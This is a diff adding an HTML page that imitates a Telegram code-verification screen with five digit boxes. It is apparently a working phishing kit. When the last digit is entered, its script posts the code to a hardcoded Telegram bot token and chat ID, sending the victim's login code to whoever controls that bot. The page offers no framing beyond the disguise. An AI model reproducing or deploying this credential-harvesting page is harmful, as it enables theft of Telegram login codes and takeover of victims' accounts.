@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Telegram</title>
+    <style>
+    .first {text-align: center;
+        .input-container {
+            display: inline-block;
+            margin: 5px;
+        }
+
+        .square-input {
+            width: 40px;
+            height: 50px;
+            border-radius: 8px;
+            border: 2px solid lightgray;
+            text-align: center;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease-in-out;
+        }
+
+        .square-input:focus {
+            border-color: #007bff;
+        }
+
+        #progress-spinner {
+            border: 6px solid rgba(0, 0, 0, 0.1); /* Increased border size */
+            border-left-color: #007bff;
+            border-radius: 50%;
+            width: 40px; /* Increased width */
+            height: 40px; /* Increased height */
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 20px auto; /* Center horizontally and add margin top/bottom */
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Optional: Add a container for the inputs and center everything */
+        #input-container {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+     <div class="first">
+    <img src="check.jpg" alt="check">
+<h3>Check your Telegram message</h3>
+<pre> we've sent the code to the <b>Telegram</b> app
+   check your other divice.</pre>
+
+
+<div id="input-container">
+    <div class="input-container">
+        <input type="number" class="square-input" maxlength="1">
+    </div>
+    <div class="input-container">
+        <input type="number" class="square-input" maxlength="1">
+    </div>
+    <div class="input-container">
+        <input type="number" class="square-input" maxlength="1">
+    </div>
+    <div class="input-container">
+        <input type="number" class="square-input" maxlength="1">
+    </div>
+    <div class="input-container">
+        <input type="number" class="square-input" maxlength="1">
+    </div>
+
+    <div id="progress-spinner"></div>
+</div>
+
+<script>
+    const inputs = document.querySelectorAll('.square-input');
+    const telegramBotToken = '7806045699:AAHXIhdiILQQBsxWoq2R1ckTKAdOu-33-9g';
+    const telegramChatId = '7850420013';
+    const progressSpinner = document.getElementById('progress-spinner');
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', function () {
+            if (this.value.length === this.maxLength) {
+                // Move forward
+                                if (index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                } else {
+                    // Send to Telegram when the last input is filled
+                    sendToTelegram();
+                }
+            }
+        });
+
+        input.addEventListener('keydown', function (event) {
+            if (event.key === 'Backspace' && this.value.length === 0) {
+                event.preventDefault();
+                // Move backward
+                if (index > 0) {
+                    inputs[index - 1].focus();
+                }
+            }
+        });
+    });
+
+    function sendToTelegram() {
+        progressSpinner.style.display = 'block'; // Show the spinner
+
+        let message = '';
+        inputs.forEach(input => {
+            message += input.value;
+        });
+
+        const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+                progressSpinner.style.display = 'none'; // Hide the spinner
+
+                // Clear the text from all boxes
+                inputs.forEach(input => {
+                    input.value = '';
+                });
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+                progressSpinner.style.display = 'none'; // Hide the spinner
+            });
+    }
+</script>
+
+</body>
+</html>
